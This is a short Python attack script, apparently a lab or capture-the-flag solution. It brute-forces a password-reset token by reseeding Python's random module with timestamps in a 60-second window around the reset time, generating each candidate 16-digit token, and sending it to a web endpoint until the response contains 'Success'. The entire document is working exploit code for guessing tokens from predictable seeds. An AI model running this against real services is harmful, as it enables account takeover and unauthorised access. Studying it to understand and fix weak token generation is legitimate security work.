import time
import random
import requests

def attack(server_url, target_time, time_window):
    # Iterate over a range of possible seeds based on the estimated time
    for offset in range(-time_window, time_window + 1):
        seed = target_time + offset
        random.seed(seed)
        
        # Assuming the application uses the first generated number as the token
        potential_token = random.randint(1000000000000000, 9999999999999999)
        
        # Construct the request URL with the potential token
        request_url = f"{server_url}?token={potential_token}"
        
        # Test the token
        response = requests.get(request_url)
        if "Success" in response.text:
            print(f"Token found: {potential_token} with seed: {seed}")
            break
    else:
        print("No valid token found in the given time window.")

server_url = "https://example.com/web01/"
#when the reset was triggered
target_time = int(time.time())
#window around the target_time to account for potential inaccuracies
time_window = 60  

attack(server_url, target_time, time_window)
